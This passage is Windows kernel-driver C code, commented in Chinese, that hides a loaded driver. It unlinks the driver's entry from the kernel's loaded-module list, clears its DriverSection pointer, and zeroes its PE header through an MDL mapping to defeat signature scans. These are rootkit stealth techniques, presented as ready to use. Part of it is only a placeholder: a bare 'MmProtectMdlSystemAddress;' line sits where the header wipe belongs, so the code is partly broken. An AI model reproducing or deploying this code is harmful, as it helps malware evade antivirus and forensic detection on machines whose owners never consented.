#include <ntddk.h>

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    PVOID NonPagedImageBase;
    ULONG_PTR NonPagedImageSize;
    ULONG Flags;
    PVOID ImageBase;
    ULONG ImageSize;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

static PKLDR_DATA_TABLE_ENTRY g_SelfEntry = NULL;
static PDRIVER_OBJECT          g_DriverObject = NULL;

NTSTATUS HideSelfModule(PDRIVER_OBJECT DriverObject)
{
    g_DriverObject = DriverObject;
    g_SelfEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!g_SelfEntry) return STATUS_UNSUCCESSFUL;

    // 1) 从 PsLoadedModuleList 双向链表摘除
    PLIST_ENTRY prev = g_SelfEntry->InLoadOrderLinks.Blink;
    PLIST_ENTRY next = g_SelfEntry->InLoadOrderLinks.Flink;
    if (prev && next) {
        prev->Flink = next;
        next->Blink = prev;
    }
    g_SelfEntry->InLoadOrderLinks.Flink = &g_SelfEntry->InLoadOrderLinks;
    g_SelfEntry->InLoadOrderLinks.Blink = &g_SelfEntry->InLoadOrderLinks;

    // 2) 断 DriverObject 的反查链
    DriverObject->DriverSection = NULL;

    // 3) 抹 PE 头签名，断 AOB 扫描（"MZ"/"PE\0\0"）
    PUCHAR base = (PUCHAR)DriverObject->DriverStart;
    if (base) {
        ULONG old;
        __try {
            MmProtectMdlSystemAddress; // 占位，见下方 MDL 写法
        } __except (EXCEPTION_EXECUTE_HANDLER) {}
    }
    return STATUS_SUCCESS;
}
```

PE 头抹除要用 MDL 把只读页变成可写，否则 `MmIsAddressValid` 过了但写入会 `0xC0000005`：

```c
NTSTATUS WipePeHeader(PVOID ImageBase, ULONG SizeToWipe)
{
    PMDL mdl = IoAllocateMdl(ImageBase, SizeToWipe, FALSE, FALSE, NULL);
    if (!mdl) return STATUS_INSUFFICIENT_RESOURCES;

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        PVOID mapped = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);
        if (mapped) {
            RtlZeroMemory(mapped, SizeToWipe);   // 抹掉 0x1000 头
        }
        MmUnlockPages(mdl);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        return GetExceptionCode();
    }
    IoFreeMdl(mdl);
    return STATUS_SUCCESS;
}
```

